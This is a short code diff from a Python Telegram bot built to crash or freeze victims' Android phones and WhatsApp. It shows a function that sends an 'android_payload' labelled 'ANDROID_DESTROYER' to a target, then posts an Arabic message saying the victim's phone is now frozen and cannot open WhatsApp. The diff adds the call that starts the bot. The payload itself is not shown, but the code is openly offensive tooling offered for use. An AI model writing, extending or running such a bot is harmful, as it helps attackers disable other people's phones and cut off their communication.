@@ -111,3 +111,4 @@ def execute_android_crash(message):
         bot.send_message(message.chat.id, f"💢 ANDROID_DESTROYER: {target}\n{android_payload}")
     
     bot.send_message(message.chat.id, "✅ **تم بنجاح! هاتف الضحية الآن في حالة تجمد (Freeze) ولن يستطيع فتح الواتس.**")
+bot.infinity_polling()
